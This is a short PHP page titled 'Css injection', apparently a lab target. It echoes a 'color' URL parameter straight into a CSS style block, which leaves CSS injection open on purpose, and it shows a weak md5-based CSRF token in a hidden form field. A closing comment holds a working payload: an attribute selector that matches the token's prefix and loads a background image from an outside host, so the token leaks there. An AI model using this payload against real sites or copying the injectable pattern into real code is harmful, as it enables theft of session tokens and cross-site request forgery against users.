<?php
$backcolor = $_GET['color'];
session_start();
function set_token() {
  $_SESSION['token'] = substr(md5(microtime(true)),0,10);
}
if(!isset($_SESSION['token']) || $_SESSION['token']=='') {
  set_token();
}

if($_POST['csrf_token']!=''){
session_destroy();
}


?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"> 
<title>Css injection</title>  
<style>
  body {background: <?php echo htmlspecialchars($backcolor);?>;}

</style>
</head>
<body>

<form name="input" action="" method="get" id="login">
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['token']?>" size="20">
<input type="text" id="username" name="username"><br>
<input type="text" id="password" name="password"><br>
<input type="submit" value="提交" />

</form>
</body>
</html>

<!--payload:grey;}input[value^=%27d505c25221%27]{background:url(%27http://g0da.org/al?1223%27)-->
